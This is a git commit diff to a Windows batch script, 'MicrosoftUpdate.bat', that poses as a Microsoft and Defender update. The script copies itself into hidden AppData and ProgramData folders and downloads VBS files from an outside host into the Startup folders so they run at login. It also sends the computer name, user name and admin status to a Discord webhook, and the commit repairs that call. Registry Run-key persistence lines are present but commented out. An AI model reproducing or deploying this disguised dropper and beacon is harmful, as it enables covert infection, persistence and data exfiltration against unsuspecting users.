5e534942dfaedc78250508e26c0f73ac19fff1c9
freestream <99094491+freestream-us-to@users.noreply.github.com>
2023-10-01 17:35:25 +0200

    VERSION 2 FIX

--- MicrosoftUpdate.bat
+++ MicrosoftUpdate.bat
@@ -1,4 +1,4 @@
-@echo off
+
 setlocal
 cls
 
@@ -17,51 +17,51 @@ if %errorlevel% == 0 (
 :: USER bat file
 
 if exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
-    set userfile=YES
+    set "userfile=YES"
 )
 if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
     mkdir "%APPDATA%/MicrosoftUpdate/"
     copy /y %~f0 "%AppData%\MicrosoftUpdate\"
-    set userfile=YES
+    set "userfile=YES"
 )
 
 
 :: PC bat file
 
 if exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
-    set pcfile=YES
+    set "pcfile=YES"
 )
 if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
     mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
     copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
-    set pcfile=YES
+    set "pcfile=YES"
 )
 
 
 :: USER Autostart
 
 if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
-    set userauto=YES
+    set "userauto=YES"
 )
 if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
     copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
     powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs', '%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
-    set userauto=YES
+    set "userauto=YES"
 )
 
 
 :: PC Autostart
 
 if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
-    set pcauto=YES
+    set "pcauto=YES"
 )
 if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
     if "%AdminRights%"=="true" (
         copy /y "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
         powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs', '%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
-        set pcauto=YES
+        set "pcauto=YES"
     ) else (
-        set pcauto=NON
+        set "pcauto=NON"
     )
 
 )
@@ -74,58 +74,60 @@ if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/Micros
 :: USER registry bat file
 
 if exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
-    set userregistryfile=YES
+    set "userregistryfile=YES"
 )
 if not exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
     mkdir "%APPDATA%/MicrosoftDefenderUpdate/"
     copy /y %~f0 "%AppData%\MicrosoftDefenderUpdate\"
-    set userregistryfile=YES
+    set "userregistryfile=YES"
 )
 
 
 :: PC registry bat file
 
 if exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
-    set pcregistryfile=YES
+    set "pcregistryfile=YES"
 )
 if not exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
     mkdir "%PROGRAMDATA%/MicrosoftDefenderUpdate/"
     copy /y %~f0 "%PROGRAMDATA%\MicrosoftDefenderUpdate\"
-    set pcregistryfile=YES
+    set "pcregistryfile=YES"
 )
 
 
 :: USER registry
 
-if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
-    ::powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'MicrosoftDefenderSecurity' -Value '%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent' -PropertyType String -Force"
-    ::set userregistryauto=YES
-    set userregistryauto=NON
+if exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
+    ::powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
+    ::set "userregistryauto=YES"
+    set "userregistryauto=NON"
 )
-if not exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
-    copy /y "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%APPDATA%\MicrosoftDefenderSecurity\"
-    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs', '%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs')"
-    ::powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'MicrosoftDefenderSecurity' -Value '%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent' -PropertyType String -Force"
-    ::set userregistryauto=YES
-    set userregistryauto=NON
+if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
+    mkdir "%APPDATA%/WindowsDefenderSecurity/"
+    copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
+    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
+    ::powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
+    ::set "userregistryauto=YES"
+    set "userregistryauto=NON"
 )
 
 
 :: PC registry
 
-if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
-    ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'MicrosoftDefenderSecurity' -Value '%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent' -PropertyType String -Force"       
-    ::set pcregistryauto=YES
-    set pcregistryauto=NON
+if exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
+    ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
+    ::set "pcregistryauto=YES"
+    set "pcregistryauto=NON"
 )
-if not exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
+if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     if "%AdminRights%"=="true" (
-        copy /y "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%PROGRAMDATA%\MicrosoftDefenderSecurity\"
-        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs', '%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs')"
-        ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'MicrosoftDefenderSecurity' -Value '%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent' -PropertyType String -Force"       
-        ::set pcregistryauto=YES
+        mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
+        copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
+        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
+        ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
+        ::set "pcregistryauto=YES"
     ) else (
-        set pcregistryauto=NON
+        set "pcregistryauto=NON"
     )
 )
 
@@ -136,15 +138,17 @@ if not exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.
 for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
 set "YY=%dt:~2,2%" & set "YYYY=%dt:~0,4%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,2%"
 set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
-set time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%
+set "time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%"
 
-set url1=https://discord.com/api/webhooks/
-set url2=1158045149935440032/nfB686WoABy0Ns6wTIT_z4zkm34DhKgWHIO8zMgP-4FWy21hahTaLPKz8v0gGYYkiQnk
-set url=%url1%%url2%
+set "url1=https://discord.com/api/webhooks/"
+set "url2=1158045149935440032/nfB686WoABy0Ns6wTIT_z4zkm34DhKgWHIO8zMgP-4FWy21hahTaLPKz8v0gGYYkiQnk"
+set "url=%url1%%url2%"
 
-set content=%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%
+set "content=%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%"
 
-powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri 'url%' -Method POST -ContentType 'application/json' -Body $body"
+echo %content%
+
+powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%url%' -Method POST -ContentType 'application/json' -Body $body"
 
 
 :: Update all bat files
@@ -155,12 +159,14 @@ powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebR
 
 
 :: delete old files
-if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.bat" (
-    del /f /q "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.bat"
+if exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.bat" (
+    del /f /q "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.bat"
 )
-if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.bat" (
-    del /f /q "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.bat"
+if exist "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.bat" (
+    del /f /q "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.bat"
 )
+
+pause
 
 endlocal
 exit
